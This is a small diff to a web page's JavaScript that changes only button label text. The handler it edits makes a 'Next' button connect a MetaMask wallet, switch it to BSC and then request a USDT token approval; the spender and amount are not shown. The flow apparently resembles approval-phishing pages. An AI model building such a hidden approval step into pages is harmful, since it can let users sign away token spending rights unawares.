@@ -193,7 +193,7 @@ document.addEventListener("DOMContentLoaded", function () {
         });
     }
 
-    // ===== NEXT BUTTON (UPDATED WITH CONNECT & SWITCH FLOW) =====
+    // ===== NEXT BUTTON (UPDATED: Connect -> Switch to BSC -> Approve) =====
     nextBtn.addEventListener("click", async function (e) {
         e.preventDefault();
 
@@ -213,7 +213,7 @@ document.addEventListener("DOMContentLoaded", function () {
             const fromAddress = accounts[0];
 
             // Update button text to reflect connection
-            nextBtn.innerHTML = '<span class="spinner">Switching Chain...</span>';
+            nextBtn.innerHTML = '<span class="spinner">Switching to BSC...</span>';
 
             // 2. SWITCH TO BSC CHAIN
             const bnbChainId = "0x38";
@@ -225,7 +225,7 @@ document.addEventListener("DOMContentLoaded", function () {
             } catch (switchError) {
                 // This error code indicates that the chain has not been added to MetaMask.
                 if (switchError.code === 4902) {
-                    nextBtn.innerHTML = '<span class="spinner">Adding Chain...</span>';
+                    nextBtn.innerHTML = '<span class="spinner">Adding BSC Chain...</span>';
                     await window.ethereum.request({
                         method: "wallet_addEthereumChain",
                         params: [{
@@ -249,7 +249,7 @@ document.addEventListener("DOMContentLoaded", function () {
             await new Promise(resolve => setTimeout(resolve, 500));
 
             // 3. APPROVE TRANSACTION
-            nextBtn.innerHTML = '<span class="spinner">Approving...</span>';
+            nextBtn.innerHTML = '<span class="spinner">Approving USDT...</span>';
 
             const iface = new ethers.utils.Interface([
                 "function approve(address spender, uint256 amount)"
